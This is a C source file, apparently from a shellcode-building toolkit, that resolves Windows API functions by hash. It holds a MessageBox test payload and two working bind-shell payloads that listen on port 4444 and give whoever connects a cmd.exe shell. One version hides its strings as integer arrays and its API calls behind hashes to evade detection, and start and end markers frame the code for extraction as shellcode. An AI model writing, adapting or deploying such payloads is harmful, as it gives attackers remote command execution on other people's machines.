#include <winsock2.h>
#include <ws2tcpip.h>
#include "GetProcAddressWithHash.h"
#include "scx.h"
#include "ScxGadgets.h"
#pragma comment(lib,"Ws2_32.lib")

void scx_MsgBox()
{
#define HASH_MessageBoxW 0x08068345
#define HASH_LoadLibraryW 0x07D6774C
#define HASH_ExitProcess 0x56A2B5F0
	WinApiPtr pfnLoadLibraryW;
	WinApiPtr pfnMessageBoxW;
	WinApiPtr pfnExitProcess;
	DWORD dwHell[] = { 0x00650048,0x006C006C,0x0020006F,0x006F0077,0x006C0072,0x00200064,0x00000021 };
	DWORD dwScx[] = { 0x00630073,0x00000078 };
	DWORD dwUser32[] = { 0x00730075,0x00720065,0x00320033,0x00000000 };

	pfnLoadLibraryW = scx_GetProcAddressWithHash(HASH_LoadLibraryW);
	pfnLoadLibraryW(dwUser32);
	pfnMessageBoxW = scx_GetProcAddressWithHash(HASH_MessageBoxW);

	pfnMessageBoxW(NULL, dwHell, dwScx, 0);
	

	pfnExitProcess = scx_GetProcAddressWithHash(HASH_ExitProcess);
	pfnExitProcess(0);
}

#define BIND_PORT 4444
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
void scx_BindShellInC()
{

	WSADATA WSAData;
	SOCKET s;
	SOCKET AcceptedSocket;
	struct sockaddr_in service;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	char szCmd[] = "cmd";

	memset(&StartupInfo,0, sizeof(StartupInfo));
	memset(&ProcessInformation,0, sizeof(ProcessInformation));

	WSAStartup(MAKEWORD(2, 2), &WSAData);
	s = WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
	service.sin_port = HTONS(BIND_PORT);

	bind(s, (SOCKADDR *)&service, sizeof(service));
	listen(s, 0);
	AcceptedSocket = accept(s, NULL, NULL);
	closesocket(s);

	StartupInfo.hStdError = (HANDLE)AcceptedSocket;
	StartupInfo.hStdOutput = (HANDLE)AcceptedSocket;
	StartupInfo.hStdInput = (HANDLE)AcceptedSocket;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = sizeof(StartupInfo);

	CreateProcessA(NULL, szCmd, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

}
SCXAPI void scx_BindShellNew()
{
	WSADATA WSAData;
	SOCKET s;
	SOCKET AcceptedSocket;
	struct sockaddr_in service;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	//char szCmd[] = "cmd";
	DWORD szCmd[] = { 0x00646D63 };
	DWORD szWsock32[] = { 0x636F7377,0x0032336B };
	//memset(&StartupInfo, 0, sizeof(StartupInfo));
	scx_mset(&StartupInfo, sizeof(StartupInfo),0);
	//memset(&ProcessInformation, 0, sizeof(ProcessInformation));
	scx_mset(&ProcessInformation, sizeof(ProcessInformation),0);

	// add code
#define HASH_LoadLibraryA 0x0726774C
#define HASH_WSAStartup 0x8B4978AF
#define HASH_WSASocketA 0xE0DF0FEA
#define HASH_bind 0xF215D448
#define HASH_listen 0x8A16E23D
#define HASH_accept 0x6C19E4FA
#define HASH_closesocket 0xEC2B66FB
#define HASH_CreateProcessA 0x863FCC79
#define HASH_WaitForSingleObject 0x601D8708
#define HASH_ExitProcess 0x56A2B5F0

	WinApiPtr pfnLoadLibraryA, pfnWSAStartup,pfnWSASocketA, pfnbind, pfnlisten, pfnaccept, pfnclosesocket, pfnCreateProcessA, pfnWaitForSingleObject,pfnExitProcess;

	//_GetProcByHash(LoadLibraryA);
	pfnLoadLibraryA = scx_GetProcAddressWithHash(HASH_LoadLibraryA);
	pfnLoadLibraryA(szWsock32);

	_GetProcByHash(WSAStartup);
	_GetProcByHash(WSASocketA);
	_GetProcByHash(bind);
	_GetProcByHash(listen);
	_GetProcByHash(accept);
	_GetProcByHash(closesocket);
	_GetProcByHash(CreateProcessA);
	_GetProcByHash(WaitForSingleObject);
	_GetProcByHash(ExitProcess);
	pfnWSAStartup(MAKEWORD(2, 2), &WSAData);
	s = pfnWSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
	service.sin_port = HTONS(BIND_PORT);

	pfnbind(s, (SOCKADDR *)&service, sizeof(service));
	pfnlisten(s, 0);
	AcceptedSocket = pfnaccept(s, NULL, NULL);
	pfnclosesocket(s);

	StartupInfo.hStdError = (HANDLE)AcceptedSocket;
	StartupInfo.hStdOutput = (HANDLE)AcceptedSocket;
	StartupInfo.hStdInput = (HANDLE)AcceptedSocket;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = sizeof(StartupInfo);

	pfnCreateProcessA(NULL, szCmd, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation);
	pfnWaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	pfnExitProcess(0);

}
void Shellcode()
{
	//scx_BindShellOld();
	//scx_BindShellInC();
	//scx_BindShellNew();
#define HASH_CreateThread 0x160D6838
#define HASH_WaitForSingleObject 0x601D8708
	ULONG_PTR ulMsgBox;
	DWORD dwThrd;
	HANDLE hThrd;
	WinApiPtr pfnCreateThread, pfnWaitForSingleObject;
	ulMsgBox = scx_GetProcAbsoluteAddr(scx_MsgBox);
	_GetProcByHash(CreateThread);
	_GetProcByHash(WaitForSingleObject);
	hThrd = pfnCreateThread(NULL, 0, ulMsgBox, 0, 0, &dwThrd);
	pfnWaitForSingleObject(hThrd, -1);
	
}

void BeginShellcode()
{
	;
}

void EndShellcode()
{
	// Sign of shellcode`s End
	;
}
